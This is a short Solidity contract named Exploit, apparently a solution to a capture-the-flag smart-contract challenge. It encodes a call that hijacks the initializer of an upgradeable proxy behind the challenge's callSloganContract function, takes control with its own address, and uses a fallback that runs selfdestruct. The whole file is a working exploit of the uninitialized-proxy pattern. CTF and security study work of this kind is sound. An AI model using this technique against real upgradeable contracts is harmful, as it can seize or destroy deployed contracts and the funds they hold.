pragma solidity 0.8.4;

import "../console.sol";
import "./Challenge.sol";

contract Exploit {
    Challenge challenge;

    constructor(address _challenge) payable {
        challenge = Challenge(_challenge);
    }

    function finalize() public {
        bytes memory data1 = abi.encodeWithSelector(
            Slogan.setSlogan.selector,
            address(this)
        );
        bytes memory data = abi.encodeWithSelector(
            InitialiazableUpgradeableProxy.initialize.selector,
            address(this),
            data1
        );
        challenge.callSloganContract{value: 0.001 ether}(data);
        //challenge.callSloganContract(data1);
    }

    fallback() external payable {
        selfdestruct(payable(address(0)));
    }
}
